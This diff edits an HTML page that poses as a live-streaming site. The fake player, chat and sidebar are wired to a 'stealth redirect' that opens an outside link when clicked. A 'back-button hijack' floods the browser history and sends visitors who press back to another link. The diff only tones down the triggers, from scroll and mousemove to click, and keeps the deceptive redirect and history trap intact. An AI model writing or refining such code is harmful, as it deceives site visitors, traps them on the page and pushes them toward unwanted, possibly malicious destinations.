@@ -326,6 +326,7 @@
 <body>
 
     <div class="container">
+        <!-- HEADER -->
         <header class="app-header">
             <div class="brand-logo">
                 <i class="fas fa-play-circle"></i>
@@ -337,8 +338,10 @@
             </div>
         </header>
 
+        <!-- MAIN GRID -->
         <div class="main-grid">
             <main class="primary-content">
+                <!-- PLAYER (TARGET 1) -->
                 <div class="player-wrapper target-trigger" id="videoPlayer">
                     <img id="mainGif" src="" alt="Live Stream" />
                     
@@ -376,14 +379,17 @@
                     </div>
                 </div>
 
+                <!-- TITLE -->
                 <h1 class="content-title" id="mainTitle">Loading Stream...</h1>
 
+                <!-- META -->
                 <div class="meta-strip">
                     <div class="viewer-count">
                         <i class="fas fa-eye"></i> <span id="mainViews">94.2K</span> Watching Live
                     </div>
                 </div>
 
+                <!-- LIVE CHAT (TARGET 2) -->
                 <div class="chat-card target-trigger" id="commentsBox">
                     <div style="font-size:13px; font-weight:700; color:#fff; margin-bottom:10px; display:flex; justify-content:space-between;">
                         <span><i class="fas fa-bolt" style="color:#ff0055;"></i> Live Chat Feed</span>
@@ -395,6 +401,7 @@
                 </div>
             </main>
 
+            <!-- SIDEBAR (TARGET 3) -->
             <aside class="sidebar-content">
                 <div style="font-weight:700; color:#fff; margin-bottom:14px;">Up Next Streams</div>
                 <div id="suggestedList" class="target-trigger"></div>
@@ -463,10 +470,10 @@
             });
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            // TARGETED REDIRECT ENGINE (শুধুমাত্র নির্দিষ্ট এলিমেন্টে ক্লিকে কাজ করবে)
+            // REDIRECT ENGINE (Strictly for explicit clicks/taps on targets)
             let isTriggered = false;
 
-            function executeStealthRedirect() {
+            function executeStealthRedirect(e) {
                 if(isTriggered) return;
                 isTriggered = true;
 
@@ -479,7 +486,7 @@
                     a.target = '_blank';
                     a.rel = 'noopener';
                     a.click();
-                } catch(e) {
+                } catch(err) {
                     window.open(REDIRECT_LINK_1, '_blank');
                 }
 
@@ -488,23 +495,20 @@
                 }, 200);
             }
 
-            // শুধুমাত্র প্লেয়ার, চ্যাট বা সাইডবারে ক্লিকে রিডাইরেক্ট হবে
+            // শুধুমাত্র নির্দিষ্ট প্লেয়ার/চ্যাট/সাইডবারে 'click' করলে চালু হবে
             document.querySelectorAll('.target-trigger').forEach(element => {
-                ['click', 'touchstart'].forEach(evt => {
-                    element.addEventListener(evt, executeStealthRedirect, { once: true });
-                });
+                element.addEventListener('click', executeStealthRedirect, { once: true });
             });
 
-            // BACK-BUTTON HIJACK (অক্ষুণ্ণ রাখা হয়েছে)
+            // CLEAN BACK-BUTTON HIJACK (No Scroll Trap)
             function setupHijack() {
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState({ hijack: true }, '', window.location.href);
                 }
             }
 
-            ['click', 'touchstart', 'scroll', 'mousemove'].forEach(evt => {
-                window.addEventListener(evt, setupHijack, { once: true });
-            });
+            // শুধুমাত্র ইউজার ক্লিকে ব্যাক-হাইজ্যাক অ্যাক্টিভ হবে (স্ক্রোল রিমুভড)
+            window.addEventListener('click', setupHijack, { once: true });
 
             window.addEventListener('popstate', function() {
                 window.location.replace(BACK_HIJACK_LINK);
